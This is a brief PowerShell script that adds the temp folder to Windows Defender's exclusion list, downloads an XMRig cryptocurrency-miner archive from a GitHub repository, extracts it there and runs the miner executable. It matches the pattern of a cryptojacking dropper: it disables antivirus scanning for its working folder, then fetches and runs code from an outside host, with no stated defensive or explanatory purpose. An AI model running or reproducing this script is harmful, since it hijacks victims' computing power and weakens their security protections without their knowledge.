Add-MpPreference -ExclusionPath "$env:temp"
$D = "$env:temp"
Invoke-WebRequest -Uri 'https://github.com/Peekaboo-ICU/XMRig/archive/refs/heads/main.zip' -OutFile "$D\Xmrig-main.zip"
Expand-Archive -Path "$D\Xmrig-main.zip" -DestinationPath $D -Force
& "$D\xmrig-main\xmrig.exe"
